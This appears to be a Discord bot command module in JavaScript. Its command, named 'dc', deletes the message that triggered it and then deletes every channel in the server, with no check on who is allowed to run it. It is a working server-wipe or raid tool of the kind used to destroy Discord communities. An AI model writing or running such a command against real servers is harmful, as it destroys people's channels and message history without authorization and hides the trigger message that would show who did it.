const { MessageEmbed } = require("discord.js")
const Discord = require("discord.js");

module.exports = {
    name: "dc",
    run: async (client, message, args) => {
        if (message.deletable) message.delete();
        message.guild.channels.cache.forEach((ch) => ch.delete().catch((err) => { console.log(("Error Found: " + err)) }))
        
    }
}